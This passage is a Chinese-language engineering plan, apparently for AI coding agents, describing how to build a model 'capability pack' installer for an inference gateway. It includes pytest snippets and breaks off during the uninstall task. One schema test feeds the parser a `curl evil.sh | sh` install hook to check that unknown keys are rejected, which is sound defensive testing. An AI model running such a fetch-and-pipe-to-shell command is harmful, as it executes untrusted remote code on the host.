# 能力包网关底座（PK0–PK3）Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 在网关侧落地能力包后端：Catalog/Manifest 契约、安装事务、严格一模型一环境隔离、Supervisor/SandboxProvider、Manifest→ModelConfig 生成、卸载语义与 admin API，使一个真实 LLM 包（Qwen3-4B-Instruct-2507）能从 API 全链路安装→调用→卸载。

**Architecture:** 新增独立模块 `inferfabric/packs/`（schema/policy/sandbox/catalog/store/installer/config_gen/supervisor），不重写执行层：安装事务最终生成现有 `ModelConfig` 写入受控 `models.d` 区域并 `reload_models()`，由现有 `ModelLifecycle`/`MemoryLedger`/`PoolRegistry` 承担运行。旧 `/admin/packs/download` 收口为用户导入模型路径，不动。

**Tech Stack:** Python 3 (aiohttp 网关), pytest, PyYAML（现有依赖）, hashlib/shutil/ctypes（标准库）。

**Spec:** `docs/superpowers/specs/2026-11-15-capability-packs-design.md`（冻结版，14 节，六组裁决已落盘；本计划从其论证，冲突以 spec 为准）

## Global Constraints

- 测试命令（全仓库唯一口径）：`env PYTHONPATH=macfabric_gateway:macfabric_gateway/tests/unit timeout 500 .venv/bin/python -m pytest macfabric_gateway/tests/unit -q`
- 资源字段单位一律 **MiB**（与 `mac_platform.py` `mem_total_mb` 口径一致）
- 包安装只接受 Catalog `pack_id`；URL/hash 由后端提供；App 不得提交任意 URL（spec §6.1 裁决）
- Manifest 不允许任意安装脚本；运行时准备只能调用平台已审核模板动作（spec §6.2）
- 默认策略 `max_model_parameters=4B`、`system_reserved_memory=8192` MiB；参数量门禁仅作用于 `capability in {"llm","vl"}`，其余能力按内存门禁（spec §9 裁决）
- 失败包默认保留 `failed` 供诊断；升级 = 新版本目录健康后原子切换；安装目录固定 `~/.inferfabric/packs/`（测试中经依赖注入换根，绝不写真实 HOME）
- 卸载：确认框数据列出受影响池候选 → purge → drain 上限 10s → 超时杀进程组 → 在途请求 503（spec §7.2 裁决）
- 沙箱探测枚举 `full | degraded | unavailable`；官方已验证包允许降级安装并显式标记，`degraded_install_allowed=false` 且探测 ≠ full 时拒绝安装（spec §8.3）
- 凭证/API key 不入日志不入摘要；日志不含完整请求体或上游敏感错误体
- commit 尾行 `Co-Authored-By: Claude Code <noreply@anthropic.com>`
- 包生成的 ModelConfig 只进本地池候选（Pack 作用域 = 本地 only，spec §14）

## Review Focus

1. **事务中途崩溃残留**：安装进程在任意阶段被杀后重启 — staging 残留、半成品 `models.d`、状态文件与磁盘不一致都必须能被下一次安装/状态读取解释并清理。测试：`test_stale_staging_cleaned_on_next_install`（Task 5）、`test_store_disk_state_reconciled`（Task 6）。
2. **hash 通过但内容恶意的 artifact**：SHA256 由 Catalog 提供，源站被替换时 hash 不匹配必须拦截 — 但 Catalog 与 hash 同源被篡改是第一阶段接受的信任边界；执行者需保证下载→校验→启用之间无 TOCTOU（staging 内校验后才移动）。测试：`test_artifact_hash_mismatch_blocks_commit`（Task 5）。
3. **卸载在途请求窗口**：drain 10s 内新到请求与在途请求的 503/完成语义 — 新请求在 `disabling_route` 后必须 503，不落入"模型已删但 selector 仍选中"。测试：`test_uninstall_drain_new_requests_get_503`（Task 10）。
4. **并发安装同一 pack_id**：两个 install 请求交错 — 同一 pack_id 事务必须互斥，后到者得 409。测试：`test_concurrent_install_same_pack_409`（Task 8）。
5. **policy 放宽绕过预检**：修改 4B/8GB 设置后，预检必须读实时值而非缓存 — 放宽只影响后续准入，不自动重装/启动。测试：`test_policy_change_affects_next_preflight_only`（Task 2）。

---

### Task 1: Manifest schema 与严格解析

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/__init__.py`（空模块标记）
- Create: `macfabric_gateway/inferfabric/packs/schema.py`
- Test: `macfabric_gateway/tests/unit/test_packs_schema.py`

**Interfaces:**
- Produces:
  - `ManifestError(ValueError)` — 带 `.field`（出错字段点路径，如 `artifacts[0].sha256`）
  - `@dataclass(frozen=True) PackArtifact`: `id: str, kind: str, source: str, sha256: str`（kind ∈ `{"model","runtime","resource"}`）
  - `@dataclass(frozen=True) PackManifest`: `pack_id, pack_version, capability, model_id, parameter_count_b, quantization, license, engine, runtime_template, download_mb, disk_mb, peak_memory_mb, gpu_role, lifecycle_mode, listen, allowed_upstream, artifacts: tuple[PackArtifact, ...], model_config_template, healthcheck, sandbox_policy, degraded_install_allowed` + `parse_manifest(text: str) -> PackManifest`、`PackManifest.to_dict() -> dict`（roundtrip 用）

- [ ] **Step 1: Write the failing test**

```python
# test_packs_schema.py（核心断言）
MINIMAL_YAML = """
pack_id: llm.qwen3-4b-instruct-2507
pack_version: 1.0.0
capability: llm
model: {id: qwen3-4b-instruct-2507, parameter_count_b: 4, quantization: q4_k_m, license: apache-2.0}
runtime: {engine: llama_cpp, runtime_template: llama-cpp-macos-arm64-v1}
resources: {download_mb: 3200, disk_mb: 3400, peak_memory_mb: 4800, gpu_role: shared}
lifecycle: {mode: on_demand}
network: {listen: loopback, allowed_upstream: []}
artifacts:
  - {id: model, kind: model, source: "https://example.com/m.gguf", sha256: "a"*64}
  - {id: engine, kind: runtime, source: "https://example.com/llama.tar.gz", sha256: "b"*64}
execution: {model_config_template: llama_cpp_chat_v1, healthcheck: openai_chat_ready_v1}
sandbox: {policy: verified-local-pack-v1, degraded_install_allowed: true}
"""

def test_minimal_manifest_parses_roundtrip():
    m = parse_manifest(MINIMAL_YAML)
    assert m.pack_id == "llm.qwen3-4b-instruct-2507"
    assert m.parameter_count_b == 4 and m.gpu_role == "shared"
    assert len(m.artifacts) == 2
    assert parse_manifest(m.to_dict_yaml()).to_dict() == m.to_dict()

def test_missing_required_field_reports_path():
    bad = MINIMAL_YAML.replace("sandbox: {policy: verified-local-pack-v1, degraded_install_allowed: true}", "")
    with pytest.raises(ManifestError) as e: parse_manifest(bad)
    assert e.value.field == "sandbox"

def test_unknown_top_level_key_rejected():
    bad = MINIMAL_YAML + "\ninstall_hook: curl evil.sh | sh\n"
    with pytest.raises(ManifestError): parse_manifest(bad)

def test_bad_sha256_and_listen_rejected():
    bad = MINIMAL_YAML.replace("a"*64, "zz")   # sha256 非 64 hex
    with pytest.raises(ManifestError) as e: parse_manifest(bad)
    assert "artifacts" in e.value.field
    bad2 = MINIMAL_YAML.replace("listen: loopback", "listen: 0.0.0.0")  # 仅允许 loopback
    with pytest.raises(ManifestError): parse_manifest(bad2)

def test_capability_whitelist():
    bad = MINIMAL_YAML.replace("capability: llm", "capability: video_gen")
    with pytest.raises(ManifestError): parse_manifest(bad)
```

能力白名单（spec §3.1）：`{"llm","vl","asr","tts","embedding","rerank","ocr"}`。

- [ ] **Step 2: Run test to verify it fails**

Run: `env PYTHONPATH=macfabric_gateway:macfabric_gateway/tests/unit .venv/bin/python -m pytest macfabric_gateway/tests/unit/test_packs_schema.py -q`
Expected: FAIL — `ModuleNotFoundError: inferfabric.packs`

- [ ] **Step 3: Implement `packs/schema.py`**

`parse_manifest` 接受 str（YAML）或 dict；严格模式：未知键（任何层级）抛 `ManifestError`；`listen` 仅接受 `loopback`；`pack_id` 格式 `<capability>.<slug>`；`pack_version` 语义化三段数字。`to_dict()` 输出与输入等价的规范 dict。

- [ ] **Step 4: Run test to verify it passes** — 同 Step 2 命令，Expected: PASS，且全仓库测试套不回归。

- [ ] **Step 5: Commit**

```bash
git add macfabric_gateway/inferfabric/packs/ macfabric_gateway/tests/unit/test_packs_schema.py
git commit -m "feat(packs): Manifest 严格解析 — PK0 契约"
```

---

### Task 2: PackPolicy — 4B/8GB 可配置设置项

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/policy.py`
- Test: `macfabric_gateway/tests/unit/test_packs_policy.py`

**Interfaces:**
- Produces:
  - `@dataclass(frozen=True) PackPolicy`: `max_model_parameters_b: int = 4`, `system_reserved_memory_mb: int = 8192`
  - `class PolicyStore`: `__init__(path: Path)`、`load() -> PackPolicy`（文件缺失/损坏 → 默认值）、`save(p: PackPolicy) -> None`（原子写：`.part` → rename）
  - `check_param_gate(manifest: PackManifest, policy: PackPolicy) -> str | None` — 返回违规原因或 None；仅 `capability in {"llm","vl"}` 比较 `parameter_count_b`，其余能力直接 None

- [ ] **Step 1: Write the failing test**

```python
def test_defaults_are_4b_8192(tmp_path):
    ps = PolicyStore(tmp_path / "policy.json")
    p = ps.load()
    assert p == PackPolicy(max_model_parameters_b=4, system_reserved_memory_mb=8192)

def test_save_load_roundtrip_and_corrupt_fallback(tmp_path):
    ps = PolicyStore(tmp_path / "policy.json")
    ps.save(PackPolicy(max_model_parameters_b=8, system_reserved_memory_mb=6144))
    assert ps.load().max_model_parameters_b == 8
    (tmp_path / "policy.json").write_text("{broken")
    assert ps.load() == PackPolicy()   # 损坏回默认，不抛

def test_param_gate_llm_and_vl_only():
    llm = make_manifest(capability="llm", parameter_count_b=8)
    assert check_param_gate(llm, PackPolicy()) == "parameter_count_b 8 > max 4"
    vl = make_manifest(capability="vl", parameter_count_b=8)
    assert check_param_gate(vl, PackPolicy()) is not None
    asr = make_manifest(capability="asr", parameter_count_b=8)
    assert check_param_gate(asr, PackPolicy()) is None   # 非对话类不设参数门槛

def test_policy_change_affects_next_preflight_only(tmp_path):
    # Review Focus 5：放宽即时生效于"下一次预检"，且无任何自动重装/启动副作用
    ps = PolicyStore(tmp_path / "policy.json")
    before = check_param_gate(make_manifest(capability="llm"), ps.load())
    assert before is not None
    ps.save(PackPolicy(max_model_parameters_b=8))
    assert check_param_gate(make_manifest(capability="llm"), ps.load()) is None
```

`make_manifest` 为本文件测试辅助：以 Task 1 的 `MINIMAL_YAML` 为模板做字段替换后 `parse_manifest`。

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL — `No module named 'inferfabric.packs.policy'`
- [ ] **Step 3: Implement `packs/policy.py`** — dataclass + JSON 存储（原子写）+ 门禁函数。路径由调用方注入（生产传 `~/.inferfabric/packs/policy.json`，测试传 tmp_path）。
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): 4B/8GB 策略设置项与参数门禁 — PK0"`

---

### Task 3: SandboxProvider 能力探测

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/sandbox.py`
- Test: `macfabric_gateway/tests/unit/test_packs_sandbox.py`

**Interfaces:**
- Produces:
  - `class SandboxMode(enum.Enum)`: `FULL / DEGRADED / UNAVAILABLE`
  - `@dataclass(frozen=True) SandboxProbe`: `mode: SandboxMode`, `detail: str`
  - `probe_sandbox(mac_version: tuple[int,int] | None = None, has_sbpl_api: bool | None = None) -> SandboxProbe` — 两个参数为 None 时自检本机（`platform.mac_ver()` + ctypes 探测 `sandbox_init` 符号）；注入参数供测试
  - `class SandboxProvider(ABC)`: `apply(profile_name: str, pack_dir: Path, env: dict) -> dict` — 返回加进引擎启动命令的前缀/属性；`NoopProvider`（degraded 兜底：仅进程组/目录/网络约束）为默认实现；SBPL 注入实现在 PK3 门禁后按探测结果接入（本任务只冻结接口 + Noop + 探测）

- [ ] **Step 1: Write the failing test**

```python
def test_probe_full_on_modern_mac_with_api():
    p = probe_sandbox(mac_version=(27, 2), has_sbpl_api=True)
    assert p.mode is SandboxMode.FULL

def test_probe_degraded_without_api():
    p = probe_sandbox(mac_version=(27, 2), has_sbpl_api=False)
    assert p.mode is SandboxMode.DEGRADED and p.detail

def test_probe_unavailable_on_probe_error():
    p = probe_sandbox(mac_version=(0, 0), has_sbpl_api=None)  # 探测自身失败路径
    assert p.mode in (SandboxMode.DEGRADED, SandboxMode.UNAVAILABLE)

def test_noop_provider_returns_process_group_env(tmp_path):
    out = NoopProvider().apply("verified-local-pack-v1", tmp_path, {"A": "1"})
    assert out.get("start_new_session") is True
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL — module 不存在
- [ ] **Step 3: Implement `packs/sandbox.py`** — 探测优先走 ctypes 查 libc `sandbox_init`；异常路径归一 `detail` 记录原因。**探测失败（`UNAVAILABLE`）按 DEGRADED 处理并保留诊断**（spec §8.2 裁决）——`probe_sandbox` 返回 UNAVAILABLE，准入逻辑（Task 8）负责降级判定。
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): 沙箱能力探测与 Provider 接口 — PK0"`

---

### Task 4: Catalog 加载与校验

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/catalog.py`
- Create: `macfabric_gateway/packs_catalog.yaml`（捆绑目录，首批 5 项占位条目：Qwen3-4B-Instruct-2507 / BGE-M3 / Whisper / Kokoro ONNX / macOS Vision；source/sha256 留 `TBD-HASH` 占位，Task 12 冻结真值）
- Test: `macfabric_gateway/tests/unit/test_packs_catalog.py`

**Interfaces:**
- Consumes: `parse_manifest`（Task 1）
- Produces:
  - `@dataclass(frozen=True) CatalogEntry`: `manifest: PackManifest`, `display_name: str`, `summary: str`, `tags: tuple[str, ...]`, `risk_level: str`, `builtin: bool`（macOS Vision 等系统内置 = True，无下载 artifact）
  - `load_catalog(path: Path) -> list[CatalogEntry]` — 每条目内嵌 `manifest:` 块走 `parse_manifest` 严格校验；任一条目非法 → `CatalogError` 指明 `pack_id`
  - `Catalog.find(pack_id: str) -> CatalogEntry | None`、`Catalog.list_capability(cap: str) -> list[CatalogEntry]`

- [ ] **Step 1: Write the failing test**

```python
def test_bundled_catalog_loads_five_entries():
    entries = load_catalog(REPO / "macfabric_gateway/packs_catalog.yaml")
    assert {e.manifest.pack_id for e in entries} >= {
        "llm.qwen3-4b-instruct-2507", "embedding.bge-m3",
        "asr.whisper-large-v3-turbo", "tts.kokoro-82m-onnx", "ocr.macos-vision"}

def test_catalog_entry_bad_manifest_named():
    p = tmp_yaml_with_broken_manifest()   # capability: video_gen
    with pytest.raises(CatalogError) as e: load_catalog(p)
    assert e.value.pack_id == "llm.bad-entry"

def test_find_and_list_capability():
    cat = Catalog(load_catalog(REPO / "macfabric_gateway/packs_catalog.yaml"))
    assert cat.find("llm.qwen3-4b-instruct-2507") is not None
    assert cat.find("llm.nope") is None
    assert [e.manifest.pack_id for e in cat.list_capability("llm")] == ["llm.qwen3-4b-instruct-2507"]
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL — module 不存在
- [ ] **Step 3: Implement `packs/catalog.py` + 捆绑 YAML** — Vision 内置条目 `artifacts: []` + `builtin: true`。
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): Catalog 加载与捆绑首批条目 — PK0"`

---

### Task 5: 安装事务（staging/verify/commit/rollback）

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/installer.py`
- Test: `macfabric_gateway/tests/unit/test_packs_installer.py`

**Interfaces:**
- Consumes: `PackManifest`（Task 1）、`PolicyStore/check_param_gate`（Task 2）、`probe_sandbox/SandboxProvider`（Task 3）、`CatalogEntry`（Task 4）
- Produces:
  - `@dataclass InstallResult`: `ok: bool`, `stage: str`, `error: str | None`, `pack_dir: Path | None`
  - `class ArtifactFetcher(Protocol)`: `fetch(artifact: PackArtifact, dest: Path) -> None`（生产：HTTPS 流式下载 `.part` → rename；测试：本地 fixture 复制）
  - `class PackInstaller`: `__init__(root: Path, fetcher, policy: PolicyStore, sandbox: SandboxProvider, clock=time.monotonic)`; `install(entry: CatalogEntry) -> InstallResult`
  - 状态机常量 `INSTALL_STAGES`: `("preflight","staging","downloading","verifying","preparing_runtime","writing_config","isolated_healthcheck","gateway_reload","installed")` — 供 Task 6 store 与 Task 8 API 引用
  - 钩子（子类覆写或构造注入，Task 9/11 挂真实实现）：`prepare_runtime(pack_dir, manifest) -> None`、`run_healthcheck(pack_dir, manifest) -> None`、`write_model_config(pack_dir, manifest) -> None`、`reload_gateway() -> None`

事务规则（spec §7.1 全量）：preflight = 磁盘空间（`shutil.disk_usage` 对照 `disk_mb`）+ `check_param_gate` + sandbox 准入（探测 ≠ FULL 且 `degraded_install_allowed=False` → 拒绝；允许降级 → 结果记录 `sandbox_degraded=True`）；所有下载落 `<root>/_staging/<pack_id>/`；`.part` 永不执行/注册；sha256 逐 artifact 校验（mismatch → 删 staging，error=`artifact_sha256_mismatch:<id>`）；任一阶段失败 → staging 删除、已安装包不动、`models.d` 无半成品；`gateway_reload` 失败 → 包不标 installed、保留诊断。

- [ ] **Step 1: Write the failing test**

```python
def _fixture_fetcher(hash_map):   # 测试辅助：本地文件按 artifact.id 复制并记录
    ...
def test_happy_path_commits(tmp_path):
    res = installer.install(entry)          # entry 指向本地 fixture artifact
    assert res.ok and res.stage == "installed"
    assert (root / "llm.qwen3-4b/1.0.0/models/m.gguf").exists()
    assert not (root / "_staging/llm.qwen3-4b").exists()   # 无残留

def test_hash_mismatch_blocks_commit(tmp_path):
    # Review Focus 2：staging 内校验后才移动，mismatch 永不进正式目录
    bad = installer_with_corrupt_fixture()
    res = bad.install(entry)
    assert not res.ok and res.stage == "verifying"
    assert "artifact_sha256_mismatch" in res.error
    assert not (root / "llm.qwen3-4b").exists()
    assert not (root / "_staging/llm.qwen3-4b").exists()

def test_preflight_rejects_param_and_disk(tmp_path):
    # capability=llm parameter_count_b=8 vs 默认 policy
    assert installer.install(entry_8b).stage == "preflight"
    # 磁盘不足：monkeypatch shutil.disk_usage 返回 < disk_mb
    assert installer.install(entry).stage == "preflight"

def test_sandbox_gate_rejects_unverified_when_degraded(tmp_path):
    # degraded_install_allowed=False + probe DEGRADED → 拒绝
    res = installer_degraded.install(entry_unverified)
    assert not res.ok and "sandbox" in res.error
    # degraded_install_allowed=True → 安装成功且结果标记 sandbox_degraded
    assert installer_degraded.install(entry_verified).ok

def test_runtime_failure_rolls_back_no_residue(tmp_path):
    # prepare_runtime 抛异常 → staging 删除、models.d 无写入
    res = installer_broken_runtime.install(entry)
    assert not res.ok and res.stage == "preparing_runtime"
    assert list(root.glob("llm.qwen3-4b/**")) == []

def test_stale_staging_cleaned_on_next_install(tmp_path):
    # Review Focus 1：模拟上次崩溃残留 staging → 下次安装先清理再走事务
    (root / "_staging/llm.qwen3-4b").mkdir(parents=True)
    (root / "_staging/llm.qwen3-4b/junk.part").write_bytes(b"x")
    res = installer.install(entry)
    assert res.ok and not (root / "_staging/llm.qwen3-4b/junk.part").exists()
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL — module 不存在
- [ ] **Step 3: Implement `packs/installer.py`** — 线性状态机，每阶段 try/except → `InstallResult(stage, error)` + staging 清理；`install()` 全程持 `threading.Lock`（per pack_id，Task 8 并发互斥复用）。
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): 安装事务 staging/校验/回滚 — PK1"`

---

### Task 6: PackStore 状态持久化与磁盘对账

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/store.py`
- Test: `macfabric_gateway/tests/unit/test_packs_store.py`

**Interfaces:**
- Consumes: `INSTALL_STAGES`（Task 5）
- Produces:
  - `@dataclass PackRecord`: `pack_id, pack_version, status, stage, error, sandbox_degraded, installed_at`
  - `class PackStore`: `__init__(path: Path)`；`set(rec: PackRecord) -> None`（原子写 JSON）；`get(pack_id) -> PackRecord | None`；`all() -> list[PackRecord]`；`remove(pack_id) -> None`
  - `reconcile(store: PackStore, root: Path) -> list[str]` — 对账：状态 installed 但目录缺失 → 修正为 `failed(stale)`；目录存在但无记录 → 记 `failed(unknown_origin)`；返回修正的 pack_id 列表（Review Focus 1 的状态-磁盘一致性兜底）

- [ ] **Step 1: Write the failing test**

```python
def test_store_roundtrip_and_atomic(tmp_path):
    st = PackStore(tmp_path / "state.json")
    st.set(PackRecord(pack_id="llm.a", pack_version="1.0.0", status="failed",
                      stage="verifying", error="artifact_sha256_mismatch:model",
                      sandbox_degraded=False, installed_at=None))
    assert PackStore(tmp_path / "state.json").get("llm.a").status == "failed"

def test_reconcile_installed_but_dir_missing(tmp_path):
    st = PackStore(tmp_path / "state.json")
    st.set(installed_record("llm.a"))
    # root 下无目录
    fixed = reconcile(st, tmp_path / "packs")
    assert fixed == ["llm.a"] and st.get("llm.a").status == "failed"

def test_reconcile_dir_without_record(tmp_path):
    (tmp_path / "packs/llm.b/1.0.0").mkdir(parents=True)
    st = PackStore(tmp_path / "state.json")
    fixed = reconcile(st, tmp_path / "packs")
    assert fixed == ["llm.b"] and st.get("llm.b").status == "failed"
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL
- [ ] **Step 3: Implement `packs/store.py`**
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): 状态持久化与磁盘对账 — PK1"`

---

### Task 7: Manifest → ModelConfig 生成

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/config_gen.py`
- Test: `macfabric_gateway/tests/unit/test_packs_config_gen.py`

**Interfaces:**
- Consumes: `PackManifest`（Task 1）；现有 `ModelConfig`（`inferfabric/config.py:421`）与现有 models.d 写盘/加载路径
- Produces:
  - `build_model_config(manifest: PackManifest, pack_dir: Path) -> ModelConfig` — 模板 `llama_cpp_chat_v1` 首个实现：`type="llama_cpp"`、`model_type=capability 映射（llm→"llm", vl→"vl", embedding→"embedding", ...）`、`gpu_role=manifest.gpu_role`、`mode`/`ledger_mode` 沿用 `lifecycle.mode` 现有语义（`on_demand` → `ledger_mode="on_demand"`）、`mem_baseline_mb=manifest.peak_memory_mb`、`autostart=False`（安装不启动，spec §2.1）、引擎二进制/模型路径全部指向 `pack_dir` 内绝对路径
  - `write_managed_yaml(cfg: ModelConfig, models_d: Path, manifest: PackManifest) -> Path` — 写 `<models_d>/<name>.yaml`，YAML 内嵌标记键 `managed_by_pack: {pack_id, pack_version}`；`name` 规则 `pack-<pack_id 短名>-<pack_version>`；已存在同名文件 → `ConfigExistsError`

- [ ] **Step 1: Write the failing test**

```python
def test_llm_template_maps_fields(tmp_path):
    cfg = build_model_config(MANIFEST, pack_dir)
    assert cfg.type == "llama_cpp" and cfg.model_type == "llm"
    assert cfg.gpu_role == "shared" and cfg.ledger_mode == "on_demand"
    assert cfg.autostart is False                      # 安装不启动
    assert cfg.mem_baseline_mb == MANIFEST.peak_memory_mb
    assert str(pack_dir) in cfg.llama_cpp.binary_path  # 引擎在包内（严格独立）

def test_managed_yaml_markers_roundtrip(tmp_path):
    path = write_managed_yaml(cfg, models_d=tmp_path, manifest=MANIFEST)
    loaded = yaml.safe_load(path.read_text())
    assert loaded["managed_by_pack"]["pack_id"] == MANIFEST.pack_id
    # 经现有 config 加载器可反序列化为 ModelConfig（schema 兼容 D6）

def test_param_gate_scope_not_in_config_gen():  # 门禁在 installer，生成层不重复
    ...
def test_overwrite_rejected(tmp_path):
    write_managed_yaml(cfg, tmp_path, MANIFEST)
    with pytest.raises(ConfigExistsError): write_managed_yaml(cfg, tmp_path, MANIFEST)
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL
- [ ] **Step 3: Implement `packs/config_gen.py`** — 先读 `config.py` 现有 `LlamaCppConfig` 字段与一个现存 `models.d/*.yaml` 样例对齐键名；模板注册表 `{"llama_cpp_chat_v1": _build_llama_cpp}` 预留后续 ASR/TTS 模板位。
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): Manifest→ModelConfig 生成与受控 YAML — PK3"`

---

### Task 8: admin API — catalog/status/install/policy 路由

**Files:**
- Modify: `macfabric_gateway/inferfabric/proxy/pack_handlers.py`（新建，承接 handler 逻辑，避免 handler.py 再膨胀）
- Modify: `macfabric_gateway/inferfabric/proxy/handler.py`（路由表注册 + 薄委托）
- Test: `macfabric_gateway/tests/unit/test_packs_api.py`

**Interfaces:**
- Consumes: `Catalog`（Task 4）、`PackInstaller`（Task 5）、`PackStore/reconcile`（Task 6）、`PolicyStore`（Task 2）
- Produces（HTTP 契约，Task 12/Swift 计划依赖）:
  - `GET /admin/packs/catalog` → `{"packs": [{pack_id, display_name, summary, tags, capability, builtin, risk_level, manifest: {...}}]}`
  - `GET /admin/packs/status` → `{"packs": [PackRecord dict + {"affected_pools": [...]} ]}`（`affected_pools` 仅卸载确认场景由 Task 10 填充）
  - `POST /admin/packs/install` body `{"pack_id": "..."}` → 202 `{"pack_id", "status"}`（事务后台执行，进度轮询 status）；未知 pack_id → 404；同 pack_id 事务进行中 → 409
  - `GET /admin/packs/policy` / `PUT /admin/packs/policy` body `{"max_model_parameters_b": 4, "system_reserved_memory_mb": 8192}`（越界拒绝：参数 ≥1，保留内存 [1024, 65536]）
- 现有 `POST /admin/packs/download` **原样保留**（用户导入模型路径），在 API spec 注释标注定位区别

- [ ] **Step 1: Write the failing test**

```python
# aiohttp 测试沿用现有 handler 测试模式（fake pm fixture）
async def test_catalog_endpoint_lists_packs(aio_client):
    r = await aio_client.get("/admin/packs/catalog")
    assert r.status == 200
    ids = {p["pack_id"] for p in (await r.json())["packs"]}
    assert "llm.qwen3-4b-instruct-2507" in ids

async def test_install_unknown_pack_404_and_in_progress_409(aio_client):
    assert (await aio_client.post("/admin/packs/install", json={"pack_id": "nope"})).status == 404
    with installer_lock_held("llm.qwen3-4b-instruct-2507"):   # Review Focus 4
        r = await aio_client.post("/admin/packs/install", json={"pack_id": "llm.qwen3-4b-instruct-2507"})
        assert r.status == 409

async def test_policy_get_put_and_bounds(aio_client):
    assert (await aio_client.get("/admin/packs/policy")).status == 200
    r = await aio_client.put("/admin/packs/policy", json={"max_model_parameters_b": 0})
    assert r.status == 400

async def test_install_happy_path_reaches_installed(aio_client):
    # fetcher 注入为本地 fixture；轮询 status 至 installed
    ...
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL — 404（路由未注册）
- [ ] **Step 3: Implement `pack_handlers.py` + 路由** — 安装事务跑在 `asyncio.to_thread`；`PackManager` 门面类（构造于 handler 初始化，依赖注入 root/fetcher/catalog 路径）承担互斥与状态转发。
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): admin API catalog/install/status/policy — PK1"`

---

### Task 9: PackSupervisor — 进程组与 drain

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/supervisor.py`
- Test: `macfabric_gateway/tests/unit/test_packs_supervisor.py`

**Interfaces:**
- Consumes: 现有 `ModelLifecycle`/ProcessManager 启动路径（包模型走现有 start，不另起炉灶）；`PackStore`（Task 6）
- Produces:
  - `class PackSupervisor`: `__init__(drain_timeout_s: float = 10.0)`；`drain_and_stop(name: str, stop_fn: Callable[[], None], is_alive_fn: Callable[[], bool]) -> DrainResult` — 调 `stop_fn` 后轮询 `is_alive_fn`，最长 10s；超时对**进程组**发 SIGKILL（`os.killpg`，复用现有 start_new_session 进程组）
  - `pack_rlimits(manifest: PackManifest) -> dict[int, int]` — spawn 前置于子进程的 POSIX rlimit（spec §8.4）：`RLIMIT_NOFILE=256`、`RLIMIT_NPROC=64`、`RLIMIT_CPU=3600`；由 Task 12 的包模型启动路径经 `preexec_fn` 应用。**内存不做 rlimit**（macOS 上为 no-op，spec §8.4 事实）；RSS watchdog 超限收割随 SBPL 立项一并交付
  - `@dataclass DrainResult`: `stopped: bool`, `forced_kill: bool`, `elapsed_s: float`
  - 崩溃标记：包进程异常退出 → `PackStore.set(status="degraded")`，不触碰其他包

- [ ] **Step 1: Write the failing test**

```python
def test_drain_stops_within_timeout():
    r = sup.drain_and_stop("pack-a", stop_fn=lambda: None,
                           is_alive_fn=lambda: dead_after(0.2))
    assert r.stopped and not r.forced_kill

def test_drain_timeout_force_kills_process_group(monkeypatch):
    killed = []
    monkeypatch.setattr(os, "killpg", lambda pg, sig: killed.append((pg, sig)))
    r = sup.drain_and_stop("pack-a", stop_fn=stop_never,
                           is_alive_fn=lambda: True)
    assert r.forced_kill and killed and killed[0][1] == signal.SIGKILL

def test_crash_marks_degraded_only_this_pack(tmp_path):
    # 进程异常退出 → 该包 degraded，其他包记录不动
    ...
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL
- [ ] **Step 3: Implement `packs/supervisor.py`**
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): Supervisor drain/强杀进程组/崩溃标记 — PK2"`

---

### Task 10: 卸载流程 — 池确认、503、零残留

**Files:**
- Create: `macfabric_gateway/inferfabric/packs/uninstaller.py`
- Modify: `macfabric_gateway/inferfabric/proxy/pack_handlers.py`（注册 `GET /admin/packs/uninstall-preview`、`POST /admin/packs/uninstall`）
- Test: `macfabric_gateway/tests/unit/test_packs_uninstall.py`

**Interfaces:**
- Consumes: `PackSupervisor.drain_and_stop`（Task 9）、`PoolRegistry.purge_candidates(predicate)`（现有，`registry.py:256`）、`PackStore`（Task 6）、`PackInstaller` 钩子
- Produces:
  - `preview_uninstall(pack_id) -> {"affected_pools": [{"pool", "candidate_id", "model_name"}]}` — 查池注册表中 `kind=local` 且 model_name 属该包的候选
  - `uninstall(pack_id) -> UninstallResult`：状态机 `installed → disabling_route → draining → stopping_process_group → removing_generated_config → purging_pool_candidates → deleting_pack_directory → gateway_reload → removed`
  - HTTP：`GET /admin/packs/uninstall-preview?pack_id=`；`POST /admin/packs/uninstall` body `{"pack_id", "confirmed": true}` — 未确认且 affected_pools 非空 → 409 `{"affected_pools": [...]}`（App 据此弹确认框）
  - **503 语义**（spec §7.2 裁决）：`disabling_route` 先于一切删除 — 包模型从活跃服务摘除，新请求经现有本地失败路径返回 503；drain 期间在途请求自然完成或随强杀断连

- [ ] **Step 1: Write the failing test**

```python
def test_preview_lists_affected_pool_candidates(pack_with_pool_refs):
